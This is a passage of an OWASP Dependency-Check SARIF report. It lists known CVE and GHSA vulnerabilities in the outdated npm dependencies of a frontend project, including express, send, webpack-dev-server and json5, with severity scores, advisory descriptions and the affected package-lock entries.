suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.5,"security-severity": "6.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2024-43799","shortDescription": {"text": "medium severity - CVE-2024-43799 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/send@0.17.2"},"fullDescription": {"text": "Send is a library for streaming files from the file system as a http response. Send passes untrusted user input to SendStream.redirect() which executes untrusted code. This issue is patched in send 0.19.0.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-43799 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 4.699999809265137,"security-severity": "4.699999809265137","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-v6h2-p8h4-qcjw","shortDescription": {"text": "low severity - GHSA-v6h2-p8h4-qcjw Uncontrolled Resource Consumption vulnerability in pkg:npm\/brace-expansion@1.1.11"},"fullDescription": {"text": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11\/2.0.1\/3.0.0\/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component."},"help": {"text": "","markdown": "For more information see [GHSA-v6h2-p8h4-qcjw](https://github.com/advisories/GHSA-v6h2-p8h4-qcjw)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 3.0999999046325684,"security-severity": "3.0999999046325684","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "LOW","cvssv3_baseSeverity": "LOW","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-cm22-4g7w-348p","shortDescription": {"text": "low severity - GHSA-cm22-4g7w-348p Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/serve-static@1.14.2"},"fullDescription": {"text": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in serve-static 1.16.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n"},"help": {"text": "","markdown": "For more information see [GHSA-cm22-4g7w-348p](https://github.com/advisories/GHSA-cm22-4g7w-348p)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.0,"security-severity": "5.0","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "LOW","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-qw6h-vgh9-j6wx","shortDescription": {"text": "low severity - GHSA-qw6h-vgh9-j6wx Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/express@4.17.3"},"fullDescription": {"text": "### Impact\n\nIn express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in express 4.20.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n"},"help": {"text": "","markdown": "For more information see [GHSA-qw6h-vgh9-j6wx](https://github.com/advisories/GHSA-qw6h-vgh9-j6wx)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.0,"security-severity": "5.0","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "LOW","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2022-37599","shortDescription": {"text": "high severity - CVE-2022-37599 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/loader-utils@1.4.0"},"fullDescription": {"text": "A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the resourcePath variable in interpolateName.js."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2024-43796","shortDescription": {"text": "medium severity - CVE-2024-43796 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/express@4.17.3"},"fullDescription": {"text": "Express.js minimalist web framework for node. In express < 4.20.0, passing untrusted user input - even after sanitizing it - to response.redirect() may execute untrusted code. This issue is patched in express 4.20.0."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 4.699999809265137,"security-severity": "4.699999809265137","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-rc47-6667-2j5j","shortDescription": {"text": "high severity - GHSA-rc47-6667-2j5j Inefficient Regular Expression Complexity vulnerability in pkg:npm\/http-cache-semantics@4.1.0"},"fullDescription": {"text": "http-cache semantics contains an Inefficient Regular Expression Complexity , leading to Denial of Service. This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library."},"help": {"text": "","markdown": "For more information see [GHSA-rc47-6667-2j5j](https://github.com/advisories/GHSA-rc47-6667-2j5j)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-q9mw-68c2-j6m5","shortDescription": {"text": "medium severity - GHSA-q9mw-68c2-j6m5 Uncaught Exception vulnerability in pkg:npm\/engine.io@6.1.2"},"fullDescription": {"text": "### Impact\n\nA specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process.\n\n```\nTypeError: Cannot read properties of undefined (reading 'handlesUpgrades')\n    at Server.onWebSocket (build\/server.js:515:67)\n```\n\nThis impacts all the users of the [`engine.io`](https:\/\/www.npmjs.com\/package\/engine.io) package, including those who uses depending packages like [`socket.io`](https:\/\/www.npmjs.com\/package\/socket.io).\n\n### Patches\n\nA fix has been released today (2023\/05\/02): [6.4.2](https:\/\/github.com\/socketio\/engine.io\/releases\/tag\/6.4.2)\n\nThis bug was introduced in version 5.1.0 and included in version 4.1.0 of the `socket.io` parent package. Older versions are not impacted.\n\nFor `socket.io` users:\n\n| Version range               | `engine.io` version | Needs minor update?                                                                                    |\n|-----------------------------|---------------------|--------------------------------------------------------------------------------------------------------|\n| `socket.io@4.6.x`           | `~6.4.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@4.5.x`           | `~6.2.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.4.x`           | `~6.1.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.3.x`           | `~6.0.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.2.x`           | `~5.2.0`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.1.x`           | `~5.1.1`            | Please upgrade to `socket.io@4.6.x`                                                                    |\n| `socket.io@4.0.x`           | `~5.0.0`            | Not impacted |\n| `socket.io@3.1.x`           | `~4.1.0`            | Not impacted |\n| `socket.io@3.0.x`           | `~4.0.0`            | Not impacted |\n| `socket.io@2.5.0`           | `~3.6.0`            | Not impacted |\n| `socket.io@2.4.x` and below | `~3.5.0`            | Not impacted |\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [`engine.io`](https:\/\/github.com\/socketio\/engine.io)\n\nThanks to Thomas Rinsma from Codean for the responsible disclosure."},"help": {"text": "","markdown": "For more information see [GHSA-q9mw-68c2-j6m5](https://github.com/advisories/GHSA-q9mw-68c2-j6m5)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.5,"security-severity": "6.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2025-30359","shortDescription": {"text": "medium severity - CVE-2025-30359 Exposed Dangerous Method or Function vulnerability in pkg:npm\/webpack-dev-server@4.7.3"},"fullDescription": {"text": "webpack-dev-server allows users to use webpack with a development server that provides live reloading. Prior to version 5.2.1, webpack-dev-server users' source code may be stolen when they access a malicious web site. Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject a malicious script in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables. By using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code. Version 5.2.1 contains a patch for the issue."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 5.900000095367432,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "GHSA-78xj-cgh5-2h22","shortDescription": {"text": "low severity - GHSA-78xj-cgh5-2h22 Server-Side Request Forgery (SSRF) vulnerability in pkg:npm\/ip@1.1.5"},"fullDescription": {"text": "The `isPublic()` function in the NPM package `ip` doesn't correctly identify certain private IP addresses in uncommon formats such as `0x7F.1` as private. Instead, it reports them as public by returning `true`. This can lead to security issues such as Server-Side Request Forgery (SSRF) if `isPublic()` is used to protect sensitive code paths when passed user input. Versions 1.1.9 and 2.0.1 fix the issue."},"help": {"text": "","markdown": "For more information see [GHSA-78xj-cgh5-2h22](https://github.com/advisories/GHSA-78xj-cgh5-2h22)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"source": "NPM"}},{"id": "CVE-2025-30360","shortDescription": {"text": "medium severity - CVE-2025-30360 Origin Validation Error vulnerability in pkg:npm\/webpack-dev-server@4.7.3"},"fullDescription": {"text": "webpack-dev-server allows users to use webpack with a development server that provides live reloading. Prior to version 5.2.1, webpack-dev-server users' source code may be stolen when you access a malicious web site with non-Chromium based browser. The `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening, which was reported by CVE-2018-14732. But webpack-dev-server always allows IP address `Origin` headers. This allows websites that are served on IP addresses to connect WebSocket. An attacker can obtain source code via a method similar to that used to exploit CVE-2018-14732. Version 5.2.1 contains a patch for the issue.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2025-30360 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 6.900000095367432,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "MEDIUM","source": "OSSINDEX"}},{"id": "CVE-2022-46175","shortDescription": {"text": "high severity - CVE-2022-46175 Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') vulnerability in pkg:npm\/json5@1.0.1"},"fullDescription": {"text": "JSON5 is an extension to the popular JSON file format that aims to be easier to write and maintain by hand (e.g. for config files). The `parse` method of the JSON5 library before and including versions 1.0.1 and 2.2.1 does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object. This vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations. This vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution. `JSON5.parse` should restrict parsing of `__proto__` keys when parsing JSON strings to objects. As a point of reference, the `JSON.parse` method included in JavaScript ignores `__proto__` keys. Simply changing `JSON5.parse` to `JSON.parse` in the examples above mitigates this vulnerability. This vulnerability is patched in json5 versions 1.0.2, 2.2.2, and later.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2022-46175 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 8.800000190734863,"security-severity": "8.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}}],"properties": {"disclaimer": "Dependency-Check is an open source tool performing a best effort analysis of 3rd party dependencies; false positives and false negatives may exist in the analysis performed by the tool. Use of the tool and the reporting provided constitutes acceptance for use in an AS IS condition, and there are NO warranties, implied or otherwise, with regard to the analysis or its use. Any use of the tool and the reporting provided is at the user's risk. In no event shall the copyright holder or OWASP be held liable for any damages whatsoever arising out of or in connection with the use of this tool, the analysis performed, or the resulting report.","nvd": "This product uses the NVD API but is not endorsed or certified by the NVD. This report contains data retrieved from the National Vulnerability Database: https://nvd.nist.gov","cisa": "This report may contain data retrieved from the CISA Known Exploited Vulnerability Catalog: https://www.cisa.gov/known-exploited-vulnerabilities-catalog","npm": "This report may contain data retrieved from the the Github Advisory Database (via NPM Audit API): https://github.com/advisories/","retirejs": "This report may contain data retrieved from the RetireJS community: https://retirejs.github.io/retire.js/","ossindex": "This report may contain data retrieved from the Sonatype OSS Index: https://ossindex.sonatype.org","NVD API Last Checked": "2025-09-06T11:36:23Z","NVD API Last Modified": "2025-09-06T11:15:31Z","NVD Cache Last Checked": "2025-09-06T11:36:23Z","NVD Cache Last Modified": "2025-09-06T11:15:31Z"}}},"artifacts": [{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?@babel\/helpers"},"properties": {"id1": "pkg:npm\/%40babel%2Fhelpers@7.17.2"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?@babel\/runtime"},"properties": {"id2": "pkg:npm\/%40babel%2Fruntime@7.16.7"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?@babel\/traverse"},"properties": {"id3": "pkg:npm\/%40babel%2Ftraverse@7.17.3"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?async"},"properties": {"id4": "pkg:npm\/async@2.6.3"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?body-parser"},"properties": {"id5": "pkg:npm\/body-parser@1.19.2"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?brace-expansion"},"properties": {"id6": "pkg:npm\/brace-expansion@1.1.11"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?braces"},"properties": {"id7": "pkg:npm\/braces@3.0.2"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?cookie"},"properties": {"id8": "pkg:npm\/cookie@0.4.2"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?cross-spawn"},"properties": {"id9": "pkg:npm\/cross-spawn@7.0.3"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?decode-uri-component"},"properties": {"id10": "pkg:npm\/decode-uri-component@0.2.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?engine.io"},"properties": {"id11": "pkg:npm\/engine.io@6.1.2"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?esbuild"},"properties": {"id12": "pkg:npm\/esbuild@0.14.22"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?express"},"properties": {"id13": "pkg:npm\/express@4.17.3"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?follow-redirects"},"properties": {"id14": "pkg:npm\/follow-redirects@1.14.9"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-cache-semantics"},"properties": {"id15": "pkg:npm\/http-cache-semantics@4.1.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?http-proxy-middleware"},"properties": {"id16": "pkg:npm\/http-proxy-middleware@2.0.3"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ip"},"properties": {"id17": "pkg:npm\/ip@1.1.5"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?json5"},"properties": {"id18": "pkg:npm\/json5@1.0.1"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?json5"},"properties": {"id19": "pkg:npm\/json5@2.2.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/karma.conf.js"},"hashes": {"md5": "691023b46024c7eeeef4c90277e82de4","sha1": "e884f978d113a528de4c5ba5aae019e6392f9a85","sha256": "e2bbe425f09dc625f716d117971175b8e5133c30189ee19a71d7a4ad1229d292"},"properties": {}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils"},"properties": {"id20": "pkg:npm\/loader-utils@1.4.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils"},"properties": {"id21": "pkg:npm\/loader-utils@2.0.2"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?loader-utils"},"properties": {"id22": "pkg:npm\/loader-utils@3.2.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?micromatch"},"properties": {"id23": "pkg:npm\/micromatch@4.0.4"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?minimatch"},"properties": {"id24": "pkg:npm\/minimatch@3.0.4"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?minimist"},"properties": {"id25": "pkg:npm\/minimist@1.2.5"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?nanoid"},"properties": {"id26": "pkg:npm\/nanoid@3.3.1"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?node-forge"},"properties": {"id27": "pkg:npm\/node-forge@1.2.1"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?on-headers"},"properties": {"id28": "pkg:npm\/on-headers@1.0.2"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?path-to-regexp"},"properties": {"id29": "pkg:npm\/path-to-regexp@0.1.7"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?postcss"},"properties": {"id30": "pkg:npm\/postcss@8.4.5"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?semver"},"properties": {"id31": "pkg:npm\/semver@5.7.1"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?semver"},"properties": {"id32": "pkg:npm\/semver@6.3.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?semver"},"properties": {"id33": "pkg:npm\/semver@7.0.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?send"},"properties": {"id34": "pkg:npm\/send@0.17.2"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?serialize-javascript"},"properties": {"id35": "pkg:npm\/serialize-javascript@6.0.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?serve-static"},"properties": {"id36": "pkg:npm\/serve-static@1.14.2"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?socket.io-parser"},"properties": {"id37": "pkg:npm\/socket.io-parser@4.0.4"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?socket.io"},"properties": {"id38": "pkg:npm\/socket.io@4.4.1"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?tar"},"properties": {"id39": "pkg:npm\/tar@6.1.11"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?terser"},"properties": {"id40": "pkg:npm\/terser@5.10.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?tmp"},"properties": {"id41": "pkg:npm\/tmp@0.2.1"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ua-parser-js"},"properties": {"id42": "pkg:npm\/ua-parser-js@0.7.31"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack-dev-middleware"},"properties": {"id43": "pkg:npm\/webpack-dev-middleware@5.3.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack-dev-server"},"properties": {"id44": "pkg:npm\/webpack-dev-server@4.7.3"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?webpack"},"properties": {"id45": "pkg:npm\/webpack@5.67.0"}},{"location": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?ws"},"properties": {"id46": "pkg:npm\/ws@8.2.3"}}],"results": [ {"ruleId": "GHSA-968p-4wvh-cqc8","level": "warning","message": {"text": "GHSA-968p-4wvh-cqc8 - ### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Regular_expressions\/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Regular_expressions\/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel\/preset-env` with the [`targets`](https:\/\/babeljs.io\/docs\/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https:\/\/github.com\/tc39\/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome\/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Regular_expressions\/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel\/preset-env` is using by enabling the [`debug` option](https:\/\/babeljs.io\/docs\/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel\/helpers` and `@babel\/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel\/helpers`, and instead you depend on `@babel\/core` (which itself 